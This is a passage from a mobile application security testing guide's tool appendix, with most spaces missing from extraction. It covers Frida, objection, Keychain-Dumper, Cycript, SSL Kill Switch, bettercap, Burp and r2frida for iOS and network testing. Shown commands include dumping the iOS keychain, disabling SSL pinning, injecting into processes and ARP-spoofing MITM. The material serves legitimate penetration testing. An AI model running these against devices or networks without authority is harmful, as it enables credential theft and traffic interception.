##2.thisisacallbackfunction,onlymethodnamescontaining"Text"willbeappendedtothelist defon_message(message,data): if"Text" inmessage['payload']: android_view_methods.append(message['payload']) ##3.wetellthescripttorunourcallbackeachtimeamessageisreceived script.on('message',on_message) script.load() ##4.wedosomethingwiththecollecteddata,inthiscasewejustprintit formethod inandroid_view_methods: print(method) session.detach() Thiseffectivelyfiltersthemethodsandprintsonlytheonescontainingthestring“Text”: $python3frida_python_send.py public boolean android.view.View.canResolveTextAlignment() public boolean android.view.View.canResolveTextDirection() public void android.view.View.setTextAlignment(int) public void android.view.View.setTextDirection(int) public void android.view.View.setTooltipText(java.lang.CharSequence) ... Intheend, itisuptoyoutodecidewherewouldyouliketoworkwiththedata. Sometimesitwillbemoreconvenient todoitfromJavaScriptandinothercasesPythonwillbethebestchoice. Ofcourseyoucanalsosendmessagesfrom Python to JavaScript by using script.post. Refer to the Frida docs for more information about sending and receiving messages. security Platform: ios Availableat: https://ss64.com/osx/security.html securityisamacOScommandtoadministerKeychains,keys,certificatesandtheSecurityframework. SwiftShield Platform: ios Availableat: https://github.com/rockbruno/swiftshield SwiftShieldisatoolthatgeneratesirreversible,encryptednamesforyouriOSproject’sobjects(includingyourPodsand Storyboards). Thisraisesthebarforreverseengineersandwillproducelesshelpfuloutputwhenusingreverseengineering toolssuchasclass-dumpandFrida. 546\nWarning: SwiftShield irreversibly overwrites all your source files. Ideally, you should have it run only on your CI server,andonreleasebuilds. AsampleSwiftprojectisusedtodemonstratetheusageofSwiftShield. • Checkoutsushi2k/SwiftSecurity. • OpentheprojectinXcodeandmakesurethattheprojectisbuildingsuccessfully(Product/BuildorApple-Key+B). • DownloadthelatestreleaseofSwiftShieldandunzipit. • GotothedirectorywhereyoudownloadedSwiftShieldandcopytheswiftshieldexecutableto/usr/local/bin: cpswiftshield/swiftshield/usr/local/bin/ • InyourterminalgointotheSwiftSecuritydirectory(whichyoucheckedoutinstep1)andexecutethecommand swiftshield(whichyoudownloadedinstep3): $cdSwiftSecurity $swiftshield -automatic -project-root .-automatic-project-file SwiftSecurity.xcodeproj -automatic-project-scheme SwiftSecurity SwiftShield3.4.0 Automaticmode Buildingprojecttogathermodulesandcompilerarguments... --IndexingReverseEngineeringToolsChecker.swift -- FounddeclarationofReverseEngineeringToolsChecker (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC) FounddeclarationofamIReverseEngineered (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC20amIReverseEngineeredSbyFZ) FounddeclarationofcheckDYLD (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC9checkDYLD33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ) FounddeclarationofcheckExistenceOfSuspiciousFiles ↪ (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC31checkExistenceOfSuspiciousFiles33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ) ... SwiftShieldisnowdetectingclassandmethodnamesandisreplacingtheiridentifierwithanencryptedvalue. Intheoriginalsourcecodeyoucanseealltheclassandmethodidentifiers: SwiftShieldwasnowreplacingallofthemwithencryptedvaluesthatleavenotracetotheiroriginalnameorintentionof theclass/method: Afterexecutingswiftshieldanewdirectorywillbecreatedcalledswiftshield-output. Inthisdirectoryanotherdirec- toryiscreatedwithatimestampinthefoldername. ThisdirectorycontainsatextfilecalledconversionMap.txt,that mapstheencryptedstringstotheiroriginalvalues. 547\n$catconversionMap.txt // //SwiftShieldConversionMap //AutomaticmodeforSwiftSecurity,2020-01-0213.51.03 //Deobfuscatecrashlogs (oranytextfile)byrunning: //swiftshield -deobfuscate CRASH_FILE -deobfuscate_map THIS_FILE // ViewController===>hTOUoUmUcEZUqhVHRrjrMUnYqbdqWByU viewDidLoad===>DLaNRaFbfmdTDuJCPFXrGhsWhoQyKLnO sceneDidBecomeActive===>SUANAnWpkyaIWlGUqwXitCoQSYeVilGe AppDelegate===>KftEWsJcctNEmGuvwZGPbusIxEFOVcIb Deny_Debugger===>lKEITOpOvLWCFgSCKZdUtpuqiwlvxSjx Button_Emulator===>akcVscrZFdBBYqYrcmhhyXAevNdXOKeG Thisisneededfordeobfuscatingencryptedcrashlogs. AnotherexampleprojectisavailableinSwiftShield’sGithubrepo,thatcanbeusedtotesttheexecutionofSwiftShield. MachoOView Platform: ios Availableat: https://sourceforge.net/projects/machoview/ MachoOViewisausefulvisualMach-Ofilebrowserthatalsoallowsin-fileeditingofARMbinaries. Usbmuxd Platform: ios Availableat: https://github.com/libimobiledevice/usbmuxd usbmuxdisasocketdaemonthatmonitorsUSBiPhoneconnections. Youcanuseittomapthemobiledevice’slocalhost listeningsocketstoTCPportsonyourhostcomputer. ThisallowsyoutoconvenientlySSHintoyouriOSdevicewithout settingupanactualnetworkconnection. WhenusbmuxddetectsaniPhonerunninginnormalmode,itconnectstothe phoneandbeginsrelayingrequeststhatitreceivesvia/var/run/usbmuxd. Xcode Platform: ios Availableat: https://developer.apple.com/xcode/ide/ XcodeisanIntegratedDevelopmentEnvironment(IDE)formacOSthatcontainsasuiteoftoolsfordevelopingsoftware formacOS,iOS,watchOS,andtvOS.YoucandownloadXcodeforfreefromtheofficialApplewebsite. Xcodewillofferyou differenttoolsandfunctionstointeractwithaniOSdevicethatcanbehelpfulduringapenetrationtest,suchasanalyzing logsorsideloadingofapps. Frida-ios-dump Platform: ios Availableat: https://github.com/AloneMonkey/frida-ios-dump Frida-ios-dump is a Python script that helps you retrieve the decrypted version of an iOS app (IPA) from an iOS device. ItsupportsbothPython2andPython3andrequiresFridarunningonyouriOSdevice(jailbrokenornot). Thistooluses Frida’sMemoryAPItodumpthememoryoftherunningappandrecreateanIPAfile. Becausethecodeisextractedfrom memory,itisautomaticallydecrypted. 548\ngdb Platform: ios Availableat: https://cydia.radare.org/pool/main/g/gdb/ AtooltoperformruntimeanalysisofiOSapplications-https://cydia.radare.org/pool/main/g/gdb/ radare2 for iOS Platform: ios Availableat: https://github.com/radare/radare2 Radare2 is a complete framework for reverse-engineering and analyzing binaries. The installation instructions can be foundintheGitHubrepository. Tolearnmoreonradare2youmaywanttoreadtheofficialradare2book. Learnmore: • r2wiki • LoadingiOSbinariestoradare2 • GitHubradare2Docs-iOS Frida-cycript Platform: ios Availableat: https://github.com/nowsecure/frida-cycript AforkofCycriptincludingabrandnewruntimecalledMjølnerpoweredbyFrida. Thisenablesfrida-cycripttorunonall theplatformsandarchitecturesmaintainedbyfrida-core-https://github.com/nowsecure/frida-cycript iProxy Platform: ios Availableat: https://github.com/tcurdt/iProxy AtoolusedtoconnectviaSSHtoajailbrokeniPhoneviaUSB-https://github.com/tcurdt/iProxy nm - iOS Platform: ios Availableat: http://www.manpagez.com/man/1/nm/osx-10.12.6.php nm is a tool that displays the name list (symbol table) of the given binary. You can find here more information for for iOS. SSL Kill Switch 2 Platform: ios Availableat: https://github.com/nabla-c0d3/ssl-kill-switch2 Blackbox tool to disable SSL certificate validation - including certificate pinning - within iOS and macOS Apps - https: //github.com/nabla-c0d3/ssl-kill-switch2 549\nios-deploy Platform: ios Availableat: https://github.com/ios-control/ios-deploy Withios-deployyoucaninstallanddebugiOSappsfromthecommandline,withoutusingXcode. Itcanbeinstalledvia brewonmacOS: brewinstallios-deploy Alternatively: gitclonehttps://github.com/ios-control/ios-deploy.git cdios-deploy/ xcodebuild cdbuild/Release ./ios-deploy ln-s<your-path-to-ios-deploy>/build/Release/ios-deploy/usr/local/bin/ios-deploy Thelastlinecreatesasymboliclinkandmakestheexecutableavailablesystem-wide. Reloadyourshelltomakethenew commandsavailable: zsh: #.~/.zshrc bash: #.~/.bashrc iOSbackup Platform: ios Availableat: https://github.com/avibrazil/iOSbackup iOSbackupisaPython3classthatreadsandextractsfilesfromapassword-encryptediOSbackupcreatedbyiTuneson MacandWindows. MobSF for iOS Platform: ios Availableat: https://github.com/MobSF/Mobile-Security-Framework-MobSF ByrunningMobSFlocallyonamacOShostyou’llbenefitfromaslightlybetterclass-dumpoutput. OnceyouhaveMobSFupandrunningyoucanopenitinyourbrowserbynavigatingtohttp://127.0.0.1:8000. Simply dragtheIPAyouwanttoanalyzeintotheuploadareaandMobSFwillstartitsjob. AfterMobSFisdonewithitsanalysis,youwillreceiveaone-pageoverviewofalltheteststhatwereexecuted. Thepage issplitupintomultiplesectionsgivingsomefirsthintsontheattacksurfaceoftheapplication. 550\nThefollowingisdisplayed: • Basicinformationabouttheappanditsbinaryfile. • Someoptionsto: – ViewtheInfo.plistfile. – Viewthestringscontainedintheappbinary. – Download a class-dump, if the app was written in Objective-C; if it is written in Swift no class-dump can be created. • ListallPurposeStringsextractedfromtheInfo.plistwhichgivesomehintsontheapp’spermissions. • ExceptionsintheAppTransportSecurity(ATS)configurationwillbelisted. • Abriefbinaryanalysisshowingiffreebinarysecurityfeaturesareactivatedore.g.ifthebinarymakesuseofbanned APIs. • ListoflibrariesusedbytheappbinaryandlistofallfilesinsidetheunzippedIPA. IncontrasttotheAndroidusecase,MobSFdoesnotofferanydynamicanalysisfeaturesforiOSapps. RefertoMobSFdocumentationformoredetails. class-dump Platform: ios Availableat: http://stevenygard.com/projects/class-dump/ class-dumpbySteveNygardisacommandlineutilityforexaminingtheObjective-CruntimeinformationstoredinMach-O (Machobject)files. Itgeneratesdeclarationsfortheclasses,categories,andprotocols. Sileo Platform: ios Availableat: https://cydia-app.com/sileo/ SinceiOS11jailbreaksareintroducingSileo,whichisanewjailbreakapp-storeforiOSdevices. ThejailbreakChimerafor iOS12isalsorelyingonSileoasapackagemanager. 551\nCydia Platform: ios Availableat: https://cydia.saurik.com/ CydiaisanalternativeappstoredevelopedbyJayFreeman(aka“saurik”)forjailbrokendevices. Itprovidesagraphical user interface and a version of the Advanced Packaging Tool (APT). You can easily access many “unsanctioned” app packagesthroughCydia. MostjailbreaksinstallCydiaautomatically. Many tools on a jailbroken device can be installed by using Cydia, which is the unofficial AppStore for iOS devices and allowsyoutomanagerepositories. InCydiayoushouldadd(ifnotalreadydonebydefault)thefollowingrepositoriesby navigatingtoSources->Edit,thenclickingAddinthetopleft: • http://apt.thebigboss.org/repofiles/cydia/: OneofthemostpopularrepositoriesisBigBoss,whichcontainsvarious packages,suchastheBigBossRecommendedToolspackage. • https://cydia.akemi.ai/: Add“Karen’sRepo”togettheAppSyncpackage. • https://build.frida.re: InstallFridabyaddingtherepositorytoCydia. • https://repo.chariz.io: UsefulwhenmanagingyourjailbreakoniOS11. • https://apt.bingner.com/: Anotherrepository,withquietafewgoodtools,isElucubratus,whichgetsinstalledwhen youinstallCydiaoniOS12usingUnc0ver. IncaseyouareusingtheSileoAppStore,pleasekeepinmindthattheSileoCompatibilityLayersharesyoursources betweenCydiaandSileo,however,CydiaisunabletoremovesourcesaddedinSileo,andSileoisunabletoremove sourcesaddedinCydia. Keepthisinmindwhenyou’retryingtoremovesources. AfteraddingallthesuggestedrepositoriesaboveyoucaninstallthefollowingusefulpackagesfromCydiatogetstarted: • adv-cmds: Advancedcommandline,whichincludestoolssuchasfinger,fingerd,last,lsvfs,md,andps. • AppList: Allowsdeveloperstoquerythelistofinstalledappsandprovidesapreferencepanebasedonthelist. • Apt: AdvancedPackageTool,whichyoucanusetomanagetheinstalledpackagessimilarlytoDPKG,butinamore friendlyway. Thisallowsyoutoinstall,uninstall,upgrade,anddowngradepackagesfromyourCydiarepositories. ComesfromElucubratus. • AppSyncUnified: AllowsyoutosyncandinstallunsignediOSapplications. • BigBossRecommendedTools: InstallsmanyusefulcommandlinetoolsforsecuritytestingincludingstandardUnix utilitiesthataremissingfromiOS,includingwget,unrar,less,andsqlite3client. • class-dump: A command line tool for examining the Objective-C runtime information stored in Mach-O files and generatingheaderfileswithclassinterfaces. • class-dump-z: AcommandlinetoolforexaminingtheSwiftruntimeinformationstoredinMach-Ofilesandgener- atingheaderfileswithclassinterfaces. ThisisnotavailableviaCydia,thereforepleaserefertoinstallationstepsin ordertogetclass-dump-zrunningonyouriOSdevice. Notethatclass-dump-zisnotmaintainedanddoesnotwork wellwithSwift. Itisrecommendedtousedsdumpinstead. • Clutch: Usedtodecryptanappexecutable. • Cycript: Is an inlining, optimizing, Cycript-to-JavaScript compiler and immediate-mode console environment that canbeinjectedintorunningprocesses(associatedtoSubstrate). • CydiaSubstrate: Aplatformthatmakesdevelopingthird-partyiOSadd-onseasierviadynamicappmanipulation orintrospection. • cURL:Isawellknownhttpclientwhichyoucanusetodownloadpackagesfastertoyourdevice. Thiscanbeagreat helpwhenyouneedtoinstalldifferentversionsofFrida-serveronyourdeviceforinstance. • DarwinCCTools: Ausefulsetoftoolslikenm,andstripthatarecapableofauditingmach-ofiles. • IPAInstallerConsole: ToolforinstallingIPAapplicationpackagesfromthecommandline. Afterinstallingtwocom- mandswillbeavailableinstallipaandipainstallerwhichareboththesame. • Frida: Anappyoucanusefordynamicinstrumentation. PleasenotethatFridahaschangeditsimplementationof itsAPIsovertime,whichmeansthatsomescriptsmightonlyworkwithspecificversionsoftheFrida-server(which forces you to update/downgrade the version also on macOS). Running Frida Server installed via APT or Cydia is recommended. Upgrading/downgradingafterwardscanbedone,byfollowingtheinstructionsofthisGithubissue. • Grep: Handytooltofilterlines. • Gzip: AwellknownZIPutility. • PreferenceLoader: ASubstrate-basedutilitythatallowsdeveloperstoaddentriestotheSettingsapplication,similar totheSettingsBundlesthatAppStoreappsuse. 552\n• SOcketCAT:autilitywithwhichyoucanconnecttosocketstoreadandwritemessages. Thiscancomeinhandyif youwanttotracethesyslogoniOS12devices. BesidesCydiayoucanalsosshintoyouriOSdeviceandyoucaninstallthepackagesdirectlyviaapt-get,likeforexample adv-cmds. apt-getupdate apt-getinstalladv-cmds class-dump-z Platform: ios Availableat: https://code.google.com/archive/p/networkpx/wikis/class_dump_z.wiki class-dump-zisclass-dumpre-writtenfromscratchinC++,avoidingtheuseofdynamiccalls. Removingtheseunneces- sarycallsmakesclass-dump-znearly10timesfasterthanitspredecessor. Plutil Platform: ios Availableat: https://www.theiphonewiki.com/wiki/Plutil Aprogramthatcanconvert.plistfilesbetweenabinaryversionandanXMLversion-https://www.theiphonewiki.com/wi ki/Plutil otool Platform: ios Availableat: http://www.manpagez.com/man/1/otool/ otoolisatoolfordisplayingspecificpartsofobjectfilesorlibraries. ItworkswithMach-Ofilesanduniversalfileformats. BinaryCookieReader Platform: ios Availableat: https://github.com/as0ler/BinaryCookieReader AtooltodumpallthecookiesfromthebinaryCookies.binarycookiesfile-https://github.com/as0ler/BinaryCookieReader /blob/master/BinaryCookieReader.py objection for iOS Platform: ios Availableat: https://github.com/sensepost/objection ObjectionoffersseveralfeaturesspecifictoiOS.Youcanfindthefulllistoffeaturesontheproject’spage,butherearea fewinterestingones: • RepackageapplicationstoincludetheFridagadget • DisableSSLpinningforpopularmethods 553\n• Accessapplicationstoragetodownloadoruploadfiles • ExecutecustomFridascripts • DumptheKeychain • Readplistfiles Allthesetasksandmorecanbeeasilydonebyusingthecommandsinobjection’sREPL.Forexample,youcanobtainthe classesusedinanapp,functionsofclassesorinformationaboutthebundlesofanappbyrunning: OWASP.iGoat-Swifton (iPhone:12.0)[usb] #ioshookinglistclasses OWASP.iGoat-Swifton (iPhone:12.0)[usb] #ioshookinglistclass_methods<ClassName> OWASP.iGoat-Swifton (iPhone:12.0)[usb] #iosbundleslist_bundles If you have a jailbroken device with frida-server installed, Objection can connect directly to the running Frida server to provideallitsfunctionalitywithoutneedingtorepackagetheapplication. However,itisnotalwayspossibletojailbreak thelatestversionofiOS,oryoumayhaveanapplicationwithadvancedjailbreakdetectionmechanisms. Theabilitytoperformadvanceddynamicanalysisonnon-jailbrokendevicesisoneofthefeaturesthatmakesOb- jectionincrediblyuseful. Afterfollowingtherepackagingprocessyouwillbeabletorunalltheaforementionedcommands whichmakeitveryeasytoquicklyanalyzeanapplication,orgetaroundbasicsecuritycontrols. Using Objection on iOS StartingupObjectiondependsonwhetheryou’vepatchedtheIPAorwhetheryouareusingajailbrokendevicerunning Frida-server. ForrunningapatchedIPA,objectionwillautomaticallyfindanyattacheddevicesandsearchforalistening Frida gadget. However, when using frida-server, you need to explicitly tell frida-server which application you want to analyze. ##ConnectingtoapatchedIPA $objectionexplore ##Usingfrida-pstogetthecorrectapplicationname $frida-ps -Ua|grep -iTelegram 983 Telegram ##ConnectingtotheTelegramappthroughFrida-server $objection --gadget="Telegram" explore OnceyouareintheObjectionREPL,youcanexecuteanyoftheavailablecommands. Belowisanoverviewofsomeof themostusefulones: ##Showthedifferentstoragelocationsbelongingtotheapp $env ##Disablepopularsslpinningmethods $iossslpinningdisable ##DumptheKeychain $ioskeychaindump ##DumptheKeychain,includingaccessmodifiers.Theresultwillbewrittentothehostinmyfile.json $ioskeychaindump --json <myfile.json> ##Showthecontentofaplistfile $iosplistcat <myfile.plist> MoreinformationonusingtheObjectionREPLcanbefoundontheObjectionWiki swift-demangle Platform: ios swift-demangleisanXcodetoolthatdemanglesSwiftsymbols. Formoreinformationrunxcrun swift-demangle -help onceinstalled. 554\nKeychain-Dumper Platform: ios Availableat: https://github.com/mechanico/Keychain-Dumper Keychain-dumperisaniOStooltocheckwhichkeychainitemsareavailabletoanattackeronceaniOSdevicehasbeen jailbroken. TheeasiestwaytogetthetoolistodownloadthebinaryfromitsGitHubrepoandrunitfromyourdevice: $gitclonehttps://github.com/ptoomey3/Keychain-Dumper $scp -P2222Keychain-Dumper/keychain_dumperroot@localhost:/tmp/ $ssh -p2222root@localhost iPhone:~root#chmod+x/tmp/keychain_dumper iPhone:~root#/tmp/keychain_dumper ForusageinstructionspleaserefertotheKeychain-dumperGitHubpage. Grapefruit Platform: ios Availableat: https://github.com/ChiChou/grapefruit GrapefruitisaniOSappassessmenttoolthatisusingtheFridaserverontheiOSdeviceandisabstractingmanypene- trationtestingtasksintoaWebUI.Itcanbeinstalledvianpm. $npminstall -gigf $grapefruit listeningonhttp://localhost:31337 Whenyouexecutethecommandgrapefruitalocalserverwillbestartedonport31337. Connectyourjailbrokendevice withtheFridaserverrunning,oranon-jailbrokendevicewitharepackagedappincludingFridatoyourmachineviaUSB. Onceyouclickonthe“iPhone”iconyouwillgetanoverviewofallinstalledapps. With Grapfruit it’s possible to explore different kinds of information concerning an iOS app. Once you selected the iOS appyoucanperformmanytaskssuchas: • Getinformationaboutthebinary • Viewfoldersandfilesusedbytheapplicationanddownloadthem • InspecttheInfo.plist • GetaUIDumpoftheappscreenshownontheiOSdevice • Listthemodulesthatareloadedbytheapp • Dumpclassnames • Dumpkeychainitems Cycript Platform: ios Availableat: https://www.cycript.org/ CydiaSubstrate(formerlycalledMobileSubstrate)isthestandardframeworkfordevelopingCydiaruntimepatches(the so-called“CydiaSubstrateExtensions”)oniOS.ItcomeswithCynject,atoolthatprovidescodeinjectionsupportforC. Cycript is a scripting language developed by Jay Freeman (aka Saurik). It injects a JavaScriptCore VM into a running process. Via the Cycript interactive console, users can then manipulate the process with a hybrid Objective-C++ and JavaScriptsyntax. AccessingandinstantiatingObjective-Cclassesinsidearunningprocessisalsopossible. InordertoinstallCycript,firstdownload,unpack,andinstalltheSDK. 555\n##oniphone $wgethttps://cydia.saurik.com/api/latest/3 -Ocycript.zip && unzip cycript.zip $sudocp -aCycript.lib/*.dylib/usr/lib $sudocp -aCycript.lib/cycript-apl/usr/bin/cycript TospawntheinteractiveCycriptshell,run“./cycript”or“cycript”ifCycriptisonyourpath. $cycript cy# Toinjectintoarunningprocess,wefirstneedtofindtheprocessID(PID).Runtheapplicationandmakesuretheappisin theforeground. Runningcycript -p <PID>injectsCycriptintotheprocess. Toillustrate,wewillinjectintoSpringBoard (whichisalwaysrunning). $ps -ef|grep SpringBoard 50178100:00.00 ??0:10.57/System/Library/CoreServices/SpringBoard.app/SpringBoard $./cycript -p78 cy# Oneofthefirstthingsyoucantryoutistogettheapplicationinstance(UIApplication),youcanuseObjective-Csyn- tax: cy#[UIApplicationsharedApplication] cy#vara=[UIApplicationsharedApplication] Usethatvariablenowtogettheapplication’sdelegateclass: cy#a.delegate Let’strytotriggeranalertmessageonSpringBoardwithCycript. cy#alertView=[[UIAlertViewalloc]initWithTitle:@"OWASPMASTG" message:@"MobileApplicationSecurityTestingGuide" delegate:nilcancelButtonitle:@"OK" ↪ otherButtonTitles:nil] ##"<UIAlertView:0x1645c550;frame=(00;00);layer=<CALayer:0x164df160>>" cy#[alertViewshow] cy#[alertViewrelease] 556\nFindtheapp’sdocumentdirectorywithCycript: cy#[[NSFileManagerdefaultManager]URLsForDirectory:NSDocumentDirectoryinDomains:NSUserDomainMask][0] ##"file:///var/mobile/Containers/Data/Application/A8AE15EE-DC8B-4F1C-91A5-1FED35212DF/Documents/" Thecommand[[UIAppkeyWindow]recursiveDescription].toString()returnstheviewhierarchyofkeyWindow. The description of every subview and sub-subview ofkeyWindow is shown. The indentation space reflects the relationships betweenviews. Forexample,UILabel,UITextField,andUIButtonaresubviewsofUIView. cy#[[UIAppkeyWindow]recursiveDescription].toString() `<UIWindow: 0x16e82190;frame =(00;320568); gestureRecognizers =<NSArray: 0x16e80ac0>; layer =<UIWindowLayer: 0x16e63ce0>> |<UIView: 0x16e935f0; frame =(00;320568); autoresize =W+H; layer =<CALayer: 0x16e93680>> | |<UILabel:0x16e8f840;frame=(040;8220.5);text='iamgroot!';hidden=YES;opaque=NO;autoresize=RM+BM;userInteractionEnabled=NO;layer= ↪ <_UILabelLayer: 0x16e8f920>> | |<UILabel: 0x16e8e030; frame =(0110.5; 32020.5); text ='ASecretIsFoundInThe...';opaque =NO;autoresize =RM+BM; userInteractionEnabled =NO; ↪ layer =<_UILabelLayer: 0x16e8e290>> | |<UITextField: 0x16e8fbd0; frame =(8141; 30430); text ='';clipsToBounds =YES; opaque =NO;autoresize =RM+BM; gestureRecognizers =<NSArray: ↪ 0x16e94550>; layer =<CALayer: 0x16e8fea0>> | | |<_UITextFieldRoundedRectBackgroundViewNeue: 0x16e92770; frame = (00;30430); opaque =NO;autoresize =W+H; userInteractionEnabled =NO;layer = ↪ <CALayer: 0x16e92990>> | |<UIButton: 0x16d901e0; frame =(8191; 30430); opaque =NO;autoresize =RM+BM; layer =<CALayer: 0x16d90490>> | | |<UIButtonLabel:0x16e72b70;frame=(1336;3818);text='Verify';opaque=NO;userInteractionEnabled=NO;layer=<_UILabelLayer:0x16e974b0>> | |<_UILayoutGuide: 0x16d92a00; frame =(00;020); hidden =YES; layer =<CALayer: 0x16e936b0>> | |<_UILayoutGuide: 0x16d92c10; frame =(0568; 00);hidden =YES; layer =<CALayer: 0x16d92cb0>>` YoucanalsouseCycript’sbuilt-infunctionssuchaschoosewhichsearchestheheapforinstancesofthegivenObjective-C class: 557\ncy#choose(SBIconModel) [#"<SBIconModel:0x1590c8430>"] LearnmoreintheCycriptManual. xcrun Platform: ios Availableat: http://www.manpagez.com/man/1/xcrun/ xcruncanbeusedinvokeXcodedevelopertoolsfromthecommand-line,withouthavingtheminthepath. Forexample youmaywanttouseittolocateandrunswift-demangleorsimctl. optool Platform: ios Availableat: https://github.com/alexzielenski/optool optool is a tool which interfaces with MachO binaries in order to insert/remove load commands, strip code signatures, resign,andremoveaslr. Toinstallit: gitclonehttps://github.com/alexzielenski/optool.git cdoptool/ gitsubmoduleupdate --init --recursive xcodebuild ln-s<your-path-to-optool>/build/Release/optool/usr/local/bin/optool Thelastlinecreatesasymboliclinkandmakestheexecutableavailablesystem-wide. Reloadyourshelltomakethenew commandsavailable: zsh: #.~/.zshrc bash: #.~/.bashrc dsdump Platform: ios Availableat: https://github.com/DerekSelander/dsdump dsdumpisatooltodumpObjective-CclassesandSwifttypedescriptors(classes,structs,enums). ItonlysupportsSwift version5orhigheranddoesnotsupportARM32-bitbinaries. ThefollowingexampleshowshowyoucandumpObjective-CclassesandSwifttypedescriptorsofaniOSapplication. Firstverifyiftheapp’smainbinaryisaFATbinarycontainingARM64: $otool -hv[APP_MAIN_BINARY_FILE] Machheader magiccputypecpusubtype caps filetypencmdssizeofcmds flags MH_MAGIC ARM V7 0x00 EXECUTE 39 5016 NOUNDEFSDYLDLINKTWOLEVELPIE Machheader magiccputypecpusubtype caps filetypencmdssizeofcmds flags MH_MAGIC_64 ARM64 ALL 0x00 EXECUTE 38 5728 NOUNDEFSDYLDLINKTWOLEVELPIE Ifyes,thenwespecifythe“–arch”parameterto“arm64”,otherwiseitisnotneededifthebinaryonlycontainsanARM64 binary. 558\n##DumptheObjective-Cclassestoatemporaryfile $dsdump --objc --color --verbose=5--arch arm64 --defined [APP_MAIN_BINARY_FILE]>/tmp/OBJC.txt ##DumptheSwifttypedescriptorstoatemporaryfileiftheappisimplementedinSwift $dsdump --swift --color --verbose=5--arch arm64 --defined [APP_MAIN_BINARY_FILE]>/tmp/SWIFT.txt YoucanfindmoreinformationabouttheinnerworkingsofdsdumpandhowtoprogrammaticallyinspectaMach-Obinary todisplaythecompiledSwifttypesandObjective-Cclassesinthisarticle. bettercap Platform: network Availableat: https://github.com/bettercap/bettercap Apowerfulframeworkwhichaimstooffertosecurityresearchersandreverseengineersaneasytouse,all-in-onesolution for Wi-Fi, Bluetooth Low Energy, wireless HID hijacking and Ethernet networks reconnaissance. It can be used during network penetration tests in order to simulate a man-in-the-middle (MITM) attack. This is achieved by executing ARP poisoningorspoofingtothetargetcomputers. Whensuchanattackissuccessful, allpacketsbetweentwocomputers areredirectedtoathirdcomputerthatactsastheman-in-the-middleandisabletointerceptthetrafficforanalysis. bettercapisapowerfultooltoexecuteMITMattacksandshouldbepreferrednowadays,insteadofettercap. See alsoWhyanotherMITMtool? onthebettercapsite. bettercap is available for all major Linux and Unix operating systems and should be part of their respective package installation mechanisms. You need to install it on your host computer that will act as the MITM. On macOS it can be installedbyusingbrew. brewinstallbettercap ForKaliLinuxyoucaninstallbettercapwithapt-get: apt-getupdate apt-getinstallbettercap ThereareinstallationinstructionsaswellforUbuntuLinux18.04onLinuxHint. Burp Suite Platform: network Availableat: https://portswigger.net/burp/communitydownload BurpSuiteisanintegratedplatformforperformingsecuritytestingmobileandwebapplications. Its tools work together seamlessly to support the entire testing process, from initial mapping and analysis of attack surfaces to finding and exploiting security vulnerabilities. Burp Proxy operates as a web proxy server for Burp Suite, which is positioned as a man-in-the-middle between the browser and web servers. Burp Suite allows you to intercept, inspect,andmodifyincomingandoutgoingrawHTTPtraffic. SettingupBurptoproxyyourtrafficisprettystraightforward. Weassumethatbothyourdeviceandhostcomputerare connectedtoaWi-Finetworkthatpermitsclient-to-clienttraffic. PortSwiggerprovidesgoodtutorialsonsettingupbothAndroidasiOSdevicestoworkwithBurp: • ConfiguringanAndroidDevicetoWorkWithBurp. • InstallingBurp’sCAcertificatetoanAndroiddevice. • ConfiguringaniOSDevicetoWorkWithBurp. • InstallingBurp’sCAcertificatetoaniOSdevice. Pleaserefertothesection“SettingupanInterceptionProxy”intheAndroidandiOS“BasicSecurityTesting”chaptersfor moreinformation. 559\nWireshark Platform: network Availableat: https://github.com/wireshark/wireshark Anopen-sourcepacketanalyzer-https://www.wireshark.org/download.html OWASP ZAP Platform: network Availableat: https://github.com/zaproxy/zaproxy OWASP ZAP (Zed Attack Proxy) is a free security tool which helps to automatically find security vulnerabilities in web applicationsandwebservices. tcpdump Platform: network Acommandlinepacketcaptureutility-https://www.tcpdump.org/ MITM Relay Platform: network Availableat: https://github.com/jrmdev/mitm_relay Ascripttointerceptandmodifynon-HTTPprotocolsthroughBurpandotherswithsupportforSSLandSTARTTLSintercep- tion-https://github.com/jrmdev/mitm_relay Android tcpdump Platform: network Availableat: https://www.androidtcpdump.com AcommandlinepacketcaptureutilityforAndroid. r2frida Platform: generic Availableat: https://github.com/nowsecure/r2frida r2fridaisaprojectthatallowsradare2toconnecttoFrida,effectivelymergingthepowerfulreverseengineeringcapabilities ofradare2withthedynamicinstrumentationtoolkitofFrida. r2fridacanbeusedinbothonAndroidandiOS,allowingyou to: • Attachradare2toanylocalprocessorremotefrida-serverviaUSBorTCP. • Read/Writememoryfromthetargetprocess. • LoadFridainformationsuchasmaps,symbols,imports,classesandmethodsintoradare2. • Callr2commandsfromFridaasitexposesther2pipeinterfaceintotheFridaJavascriptAPI. 560\nPleaserefertor2frida’sofficialinstallationinstructions. Withfrida-serverrunning,youshouldnowbeabletoattachtoitusingthepid,spawnpath,hostandport,ordevice-id. Forexample,toattachtoPID1234: r2frida://1234 Formoreexamplesonhowtoconnecttofrida-server,seetheusagesectioninther2frida’sREADMEpage. ThefollowingexampleswereexecutedusinganAndroidappbutalsoapplytoiOSapps. Onceinther2fridasession,allcommandsstartwith: or=!. Forexample,inradare2you’drunitodisplaythebinary information,butinr2fridayou’duse:i. Seealloptionswithr2 frida://?. [0x00000000]>:i arch x86 bits 64 os linux pid 2218 uid 1000 objc false runtime V8 java false cylang false pageSize 4096 pointerSize 8 codeSigningPolicy optional isDebuggerAttached false Tosearchinmemoryforaspecifickeyword,youmayusethesearchcommand\/: [0x00000000]>\/unacceptable Searching12bytes:756e61636365707461626c65 Searching12bytesin [0x0000561f05ebf000-0x0000561f05eca000] ... Searching12bytesin [0xffffffffff600000-0xffffffffff601000] hits:23 0x561f072d89eehit12_0unacceptablepolicyunsupportedmdalgorithmvarbadvaluec 0x561f0732a91ahit12_1unacceptableSearching12bytes:756e61636365707461 To output the search results in JSON format, we simply addj to our previous search command (just as we do in the r2 shell). Thiscanbeusedinmostofthecommands: [0x00000000]>\/junacceptable Searching12bytes:756e61636365707461626c65 Searching12bytesin [0x0000561f05ebf000-0x0000561f05eca000] ... Searching12bytesin [0xffffffffff600000-0xffffffffff601000] hits:23 {"address":"0x561f072c4223","size":12,"flag":"hit14_1","content":"unacceptable \ policyunsupportedmdalgorithmvarbadvaluec0"},{"address":"0x561f072c4275", \ 